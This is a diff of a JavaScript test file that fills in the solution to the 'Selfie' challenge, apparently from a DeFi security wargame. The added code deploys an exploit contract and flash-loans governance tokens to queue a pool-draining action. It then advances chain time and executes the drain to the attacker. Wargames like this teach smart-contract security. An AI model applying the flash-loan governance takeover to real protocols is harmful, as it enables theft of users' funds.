@@ -30,7 +30,18 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        // Deploy exploit contract.
+        const ExploitFactory = await ethers.getContractFactory('SelfieExploit', attacker);
+        const exploit = await ExploitFactory.deploy(this.governance.address, this.pool.address);
+
+        // Flash loan enough governance tokens to queue drain action.
+        await exploit.takeoverGov(TOKENS_IN_POOL);
+
+        // Simulate waiting delay.
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+
+        // After waiting for action delay, execute it.
+        await exploit.drainToAttacker();
     });
 
     after(async function () {
